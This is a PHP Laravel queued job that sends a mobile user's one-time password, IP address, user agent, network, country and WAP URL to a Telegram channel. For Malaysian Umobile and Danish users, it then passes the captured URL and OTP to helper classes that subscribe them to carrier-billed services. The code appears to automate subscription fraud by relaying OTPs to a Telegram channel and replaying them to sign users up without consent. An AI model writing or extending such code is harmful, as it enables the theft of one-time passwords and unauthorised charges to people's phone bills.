<?php

namespace App\Jobs;

use App\Helper\Common;
use App\Helper\SubscribeDenmark;
use App\Helper\SubscribeMalaysia;
use App\Notifications\ReportCheckWapUrl;
use Illuminate\Bus\Queueable;
use Illuminate\Queue\SerializesModels;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use App\Notifications\ReportGoogleChecker;
use Illuminate\Support\Facades\Notification;

class NotifyTelegramWapUrl implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    private $params;


    public function __construct($params)
    {
        $this->params = $params;
    }

    /**
     * Execute the job.
     *
     * @return void
     */
    public function handle()
    {

        try {
            $userAgent = $this->params['user_agent'] ?? null;
            $ip = $this->params['ip'] ?? null;
            $otp = $this->params['otp'] ?? null;
            $platform = $this->params['platform'] ?? null;
            $network = $this->params['network'] ?? null;
            $country = $this->params['country'] ?? null;
            $url = $this->params['url'] ?? null;

            $details = [
                'message' =>
                "Notify For From Wap URL \n\r" . "--- Data: " . $this->params['id_user']  . "
                \n\r\n\r- Platform: " . $platform." - ".  $network. " - ".  $country. "
                \n\r\n\r - URL: " . $url  . "
                \n\r\n\r - OTP: ". $otp."\n\r".
                "\n\r".'- Useragent: '.$userAgent.
                "\n\r".'- IP: '.$ip
            ];

            Notification::route('telegram', env('TELEGRAM_NOTIFY_FOR_WAP_URL'))->notify(new ReportCheckWapUrl($details));

            //if country = malaysia, network = umobile => run subscribe
            if (
                $this->isMalaysiaUmobile($this->params['country'], $this->params['network']) &&
                !empty($this->params['url']) && !empty($this->params['otp'])
            ) {
                dump(Common::getCurrentVNTime().' => Processing subscribe Umobile Malaysia...'.json_encode($this->params));
                SubscribeMalaysia::subscribeUmobile($this->params['url'], $this->params['otp'], $userAgent);
            }

            //if country = denmark => run subscribe
            $isInsert = true;
            if (!empty($this->params['action']) && strtolower($this->params['action']) == 'update') {
                $isInsert = false;
            }

            if ($this->isDenmark($this->params['country']) && $isInsert) {
                dump(Common::getCurrentVNTime().' => Processing subscribe Denmark...'.json_encode($this->params));
                SubscribeDenmark::subscribeDenmark($this->params['url'], $userAgent); //original url like this: https://mp1.mobile-gw.com/mm/dk_4t/create_redirect/145143764
            }


        } catch (\Exception $ex) {
            \Log::channel('malaysia')->error($ex);
        }
    }

    private function isMalaysiaUmobile($country, $network)
    {
        $country = strtolower(trim($country));
        $network = strtolower(trim($network));

        if ($country == 'malaysia' && strpos($network, 'umobile') !== false) {
            return true;
        }

        return false;
    }

    private function isDenmark($country)
    {
        $country = strtolower(trim($country));

        return $country == 'denmark';
    }

}
